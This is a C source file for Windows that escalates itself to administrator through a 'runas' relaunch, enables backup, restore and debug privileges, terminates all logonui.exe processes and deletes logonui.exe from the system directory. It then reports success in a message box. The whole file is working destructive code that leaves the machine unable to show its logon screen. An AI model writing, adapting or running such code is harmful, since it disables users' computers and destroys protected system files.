#include <windows.h>
#include <TlHelp32.h>


// Fixed this function so that it's now compatible with windows 2000 and higher
BOOL IsElevated( ) {
  BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(
        &NtAuthority, 
        2, 
        SECURITY_BUILTIN_DOMAIN_RID, 
        DOMAIN_ALIAS_RID_ADMINS, 
        0, 0, 0, 0, 0, 0, 
        &pAdministratorsGroup))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

Cleanup:

    if (pAdministratorsGroup)
    {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    if (ERROR_SUCCESS != dwError)
    {
      return FALSE;
    }

    return fIsRunAsAdmin;
}

BOOL
WINAPI
SetPrivilege(
	_In_ HANDLE hToken,
	_In_ PCSTR szPrivilege,
	_In_ BOOL bEnablePrivilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if ( !LookupPrivilegeValueA( NULL, szPrivilege, &luid ) )
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[ 0 ].Luid = luid;
	if ( bEnablePrivilege )
		tp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[ 0 ].Attributes = 0;

	if ( !AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof( TOKEN_PRIVILEGES ), ( PTOKEN_PRIVILEGES )NULL, ( PDWORD )NULL ) )
	{
		return FALSE;
	}

	if ( GetLastError( ) == ERROR_NOT_ALL_ASSIGNED )
	{
		return FALSE;
	}

	return TRUE;
}

void TerminateProcessName(LPCSTR lpProcessname)
{
    HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 prcs;
    prcs.dwSize = sizeof(PROCESSENTRY32);
    BOOL bTerminateProcessRes = Process32First(hProcessSnapshot, &prcs);
    while (bTerminateProcessRes)
    {
        if (!strcmp(prcs.szExeFile, lpProcessname))
        {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, prcs.th32ProcessID);
            if (hProcess != NULL)
            {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        bTerminateProcessRes = Process32Next(hProcessSnapshot, &prcs);
    }
    CloseHandle(hProcessSnapshot);
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	PVOID OldValue = NULL;
    typedef int* (*MyRedirection)(PVOID);
    HINSTANCE LibHnd = LoadLibraryA("kernel32.dll");
    MyRedirection MyDownloadFunction = (MyRedirection)GetProcAddress(LibHnd, "Wow64DisableWow64FsRedirection");
    MyDownloadFunction(&OldValue); //making sure that if the file is located in a wow64 directory,  it can still be runned. We are also making that because our program is 32 bit and it needs to access some real wow64 folders to delete logonui
if (IsElevated()) //check if our program is elevated. if not, try to elevate it
{
	HANDLE hToken = NULL;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
	//get the restore and the backup privilege
	if ( !SetPrivilege( hToken, SE_RESTORE_NAME, TRUE ) )
	{
		MessageBoxA(0, "Failed To Get the Restore Privilege.", "Error", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
		ExitProcess(0);
	}
	
	if ( !SetPrivilege( hToken, SE_BACKUP_NAME, TRUE ) )
	{
		MessageBoxA(0, "Failed To Get the Backup Privilege.", "Error", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
		ExitProcess(0);
	}
	
	// Set The Debug Privilege. There is no error checking here because its only to maximize our chances of terminating all logonui processes
	SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
	// get the path of logonui.exe
	char Logon[MAX_PATH];
	GetSystemDirectoryA(Logon, sizeof(Logon));
	lstrcatA(Logon, "\\logonui.exe"); // add logonui.exe to the variable

//show the user where the logonui.exe executable is
MessageBoxA(0, Logon, "Here Is Where LogonUI Is", MB_OK | MB_ICONINFORMATION);

// Set the file attributes to normal to maximize the chances of successful deletion. By default, this function makes use of the SeRestorePrivilege if it is enabled.
SetFileAttributesA(Logon, FILE_ATTRIBUTE_NORMAL);

	//try to delete it right away. If it doesn't work then try to terminate all logonui.exe processes
	if (!DeleteFileA(Logon))
	{
		// either the file is in use, or it is protected more
		TerminateProcessName("logonui.exe"); //terminate all processes related to our file
		Sleep(20); //allow some time to terminate all processes on a slow operating system
		if (!DeleteFileA(Logon)){
			//if the file still cannot be deleted, exit because we actually need logonui to reboot normally
		MessageBoxA(0, "Logonui Could Not Be Deleted.", "Error", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
	ExitProcess(0);
		}
	}
	MessageBoxA(0, "Logonui Was Sucessfully Deleted", "Success", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
}
else
{
	char Me[MAX_PATH];
	GetModuleFileNameA(NULL, Me, sizeof(Me));
	ShellExecuteA(0, "runas", Me, "", "", SW_SHOWNORMAL);
}
}
